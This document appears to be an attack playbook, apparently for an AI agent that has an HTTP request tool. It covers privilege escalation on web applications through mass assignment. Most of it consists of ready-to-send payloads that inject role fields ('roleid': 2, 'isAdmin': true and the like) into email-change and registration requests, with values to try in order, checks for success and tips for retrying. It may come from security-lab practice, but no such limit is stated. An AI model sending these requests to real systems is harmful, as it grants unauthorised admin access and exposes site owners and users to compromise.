## Privilege Escalation Playbook

**STRATEGY:** Test if registration or profile update APIs accept unauthorized role manipulation.

### Critical: Check Response Bodies!
Before trying attacks, **READ the response** from normal actions (email update, profile view).
- If you see `"roleid": 1` or `"role": "user"` in responses → you know the parameter name!
- Try setting that parameter to elevated values (2, "admin", etc.)

### Step 1: Reconnaissance
1. Log in with provided credentials
2. Navigate to profile/account page
3. **Update email and READ the full response** — look for role/permission fields
4. Note any fields like: `roleid`, `role`, `isAdmin`, `permissions`, `access_level`

### Step 2: Profile Update Attack (try BOTH content types!)

**JSON format (try this first):**
```
make_request(
  url='/my-account/change-email',
  method='POST',
  headers={'Content-Type': 'application/json'},
  body='{"email": "test@test.com", "roleid": 2}'
)
```

**Form-urlencoded format:**
```
make_request(
  url='/my-account/change-email', 
  method='POST',
  headers={'Content-Type': 'application/x-www-form-urlencoded'},
  body='email=test@test.com&roleid=2'
)
```

### Step 3: Try Multiple Values
Role IDs are often numeric. Try in order:
- `"roleid": 2` (admin is often 2)
- `"roleid": 1` (sometimes admin is 1)
- `"roleid": 0` (sometimes 0 = superadmin)
- `"role": "admin"`
- `"isAdmin": true`
- `"admin": true`

### Step 4: Registration Attack (if profile fails)
```
make_request(
  url='/api/Users' or '/register',
  method='POST', 
  headers={'Content-Type': 'application/json'},
  body='{"email":"pwned@test.com","password":"test123","roleid":2}'
)
```

### Step 5: Verify Access
- Navigate to `/admin` to check if escalation worked
- If still denied, re-read the response from your last request — did `roleid` change?

### Indicators of Success
- Response shows `"roleid": 2` or elevated role
- Can access `/admin` endpoint
- User object shows `isAdmin: true` or similar

### Common Mistakes to Avoid
- ❌ Only trying form-urlencoded (many APIs use JSON)
- ❌ Only trying string values like "admin" (try numeric: 2, 1, 0)
- ❌ Not reading response bodies for clues
- ❌ Giving up after one attempt without varying content-type
